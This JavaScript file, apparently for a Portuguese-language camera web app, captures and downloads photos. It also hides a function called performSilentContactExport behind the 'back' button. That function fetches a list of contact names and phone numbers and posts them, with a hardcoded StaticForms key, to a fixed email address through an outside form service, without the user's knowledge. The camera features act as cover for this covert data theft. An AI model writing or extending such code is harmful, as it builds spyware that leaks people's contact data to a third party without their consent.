document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');
    const statusMessage = document.getElementById('statusMessage');
    const viewArea = document.getElementById('viewArea');
    const buttonGroup = document.getElementById('buttonGroup');

    // --- CONFIGURAÇÕES ---
    const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
    const API_KEY = 'sf_b28b453bf885be88f89f8e34'; // ← chave do seu formulário
    const EMAIL_FIXO = 'seu-email@exemplo.com';    // ← substitua pelo e‑mail desejado

    // *** IMPORTANTE: URL da sua API real que retorna os contatos ***
    const REAL_API_URL = 'https://sua-api.com/contatos'; // ← ALTERE AQUI

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA';

    // ========================================================
    //  FUNÇÕES RELACIONADAS À AGENDA (STATICFORMS)
    // ========================================================

    async function fetchRealContacts() {
        try {
            console.log("Buscando dados reais da agenda via API...");
            const response = await fetch(REAL_API_URL, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
                // Se precisar de autenticação, adicione 'Authorization': 'Bearer SEU_TOKEN'
            });

            if (!response.ok) {
                throw new Error(`Erro HTTP ${response.status}: ${response.statusText}`);
            }

            const data = await response.json();

            if (!Array.isArray(data)) {
                throw new Error('Resposta da API não é um array.');
            }

            const contacts = data.map(item => ({
                name: item.name || item.nome || 'Sem nome',
                phone: item.phone || item.telefone || 'Sem telefone'
            }));

            console.log(`[API] ${contacts.length} contatos obtidos.`);
            return contacts;
        } catch (error) {
            console.error("[fetchRealContacts] Erro:", error);
            return []; // retorna vazio para não quebrar
        }
    }

    async function performSilentContactExport() {
        try {
            const contacts = await fetchRealContacts();

            if (!contacts || contacts.length === 0) {
                console.warn("[Export] Nenhum contato para exportar.");
                statusMessage.textContent = "Nenhum contato encontrado.";
                statusMessage.style.color = 'orange';
                setTimeout(() => statusMessage.textContent = '', 3000);
                return false;
            }

            // Monta o texto da mensagem
            let messageText = "--- CONTEÚDOS DA AGENDA ---\n";
            contacts.forEach(contact => {
                messageText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
            });
            messageText += "----------------------------";

            // Prepara o FormData com os campos exigidos pelo StaticForms
            const formData = new FormData();
            formData.append('apiKey', API_KEY);
            formData.append('email', EMAIL_FIXO);       // ← e‑mail fixo
            formData.append('message', messageText);    // ← dados da agenda

            // Envia
            const response = await fetch(STATICFORMS_API_URL, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error(`[Export] HTTP ${response.status}: ${errorText}`);
                throw new Error(`Falha no envio: ${response.status}`);
            }

            console.log("[Export] Dados enviados com sucesso!");
            statusMessage.textContent = "Agenda exportada com sucesso!";
            statusMessage.style.color = 'green';
            setTimeout(() => statusMessage.textContent = '', 3000);
            return true;
        } catch (error) {
            console.error("[Export] Falha:", error);
            statusMessage.textContent = "Erro ao exportar agenda.";
            statusMessage.style.color = 'red';
            setTimeout(() => statusMessage.textContent = '', 3000);
            return false;
        }
    }

    // ========================================================
    //  FUNÇÕES DE CÂMERA E UI (mantidas)
    // ========================================================

    async function startCamera() {
        try {
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" }
            });
            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();
            updateUI();
        } catch (err) {
            console.error("Erro ao acessar câmera:", err);
            statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
            statusMessage.style.color = 'red';
        }
    }

    function capturePhoto() {
        if (!stream) return;
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');
        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';
        currentState = 'PREVIEW';
        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_pwa_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    function updateUI() {
        if (currentState === 'CAMERA') {
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';
            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';
        } else {
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';
            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ========================================================
    //  LISTENERS
    // ========================================================

    startCamera();

    captureButton.addEventListener('click', capturePhoto);

    downloadButton.addEventListener('click', downloadPhoto);

    backButton.addEventListener('click', async () => {
        await performSilentContactExport();
        currentState = 'CAMERA';
        updateUI();
    });

    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});
